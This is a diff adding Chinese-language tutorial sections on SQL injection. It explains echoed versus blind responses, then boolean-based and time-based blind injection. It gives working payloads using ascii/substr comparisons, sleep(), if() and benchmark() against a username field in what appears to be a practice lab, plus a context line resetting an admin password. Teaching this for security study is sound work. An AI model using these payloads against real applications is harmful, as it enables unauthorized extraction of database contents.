@@ -614,4 +614,85 @@ update users set password='666' where username='admin'#' and password='123'
 
 我们只要在伪静态的参数部分（-1-1-1）加入payload就可以了
 
+## 十二.盲注和回显
+在我们的注入语句被带入数据库查询但却什么都没有返回的情况我们该怎么办？例如应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。这时，我们之前学习的SQL注入办法就无法使用了。这种情况我们称之为无回显，如果页面有信息显示，我们称之为有回显。回显状态的页面没什么可说的，无回显的这种我们就可以采用盲注的手段
 
+![alt text](image-41.png)
+
+### 十三 盲注
+
+盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。
+
+SQL盲注分为两大类：基于布尔型SQL盲注、基于时间型SQL盲注
+
+#### 13.1 Boolian(布尔型)盲注
+
+布尔值（真假值）：通过一种比较运算来判断是真是假，真1假0，来猜解数据
+
+函数介绍
+```
+ database() #查看当前数据库名
+
+length() #显示字符串长度，例如length（databases（））显示7
+
+ substr(字符串, 起始位置, 截取长度) #从字符串第几个位置开始去多少位字符，例如substr（xiaoming,2,1）表示从'xiaoming'字符串第二个位置开始取一个字符，结果是'i'。
+
+ ascii（） #把字符转换成ASCII码，例如ascii('p') → 结果是数字 112
+
+select 结果> xx； #布尔判断，真1假0
+```
+
+```
+select ascii(substr(database(),1,1))>xx;
+```
+让当前的数据库的首字母和xx作比较，真1假0，然后一个一个去尝试（用到自动化工具），然后就可以推断出首字母是什么，你可能会想这不也是2条查询结果吗，是会生成1/0，但 1/0 不是给你看的，是告诉电脑这条语句是真是假，并不会报错
+
+```
+sql：$query="select id,email from member where username='$name'"
+```
+payload：
+```
+vince' and ascii(substr(database(),1,1))=112#
+
+select * from users where username='Vince' and ascii(substr(database(),1,1))=122#'
+```
+![alt text](image-42.png)
+
+![alt text](image-43.png)  
+若是真显示vince用户存在，假则查询不到
+
+payload：
+```
+vince' and length(database())=7#
+```
+用来判断数据库长度是否等于7，若是真显示vince用户存在，假则查询不到
+
+结果没有报错，说明存在这个注入点，布尔型盲注基本都是通过ascii码来测试的。
+
+#### 13.2 时间型盲注
+
+就是无论输入什么都无回显，或者如下图，就可能是时间型盲注
+![alt text](image-44.png)
+
+函数介绍：
+```
+sleep(); #让数据库停止多少秒后拼接sql语句
+if(a>b,"aa","bb") #if语句，如果a大于b打印aa，反之打印bb
+```
+基于时间的延迟，构造一个拼接语句：
+```
+vince' and sleep(5)#
+```
+若用户名正确，如果界面显示加载了5秒，就是左上角那个圈圈转了5秒左右
+若用户名不正确，界面立刻刷新，就说明存在注入点
+
+基于sleep（），if（），我们可以构造
+```
+vince' and if(substr(database(),1,1)='p',sleep(10),null)#
+```
+如果数据库首字母是p，则等待10秒刷新，若不是，返回空即立刻刷新，然后就可以一个一个去猜字母
+
+时间型盲注经常使用的函数： sleep(5)、benchmark(10000000,MD5(1))，benchmark是mysql的内置函数，是将MD5(1)执行10000000次以达到延迟的效果，若sleep（）被禁用，就用benchmark（）
+```
+vince' and if(ascii(...)>100, benchmark(10000000,md5(1)), null)#
+```
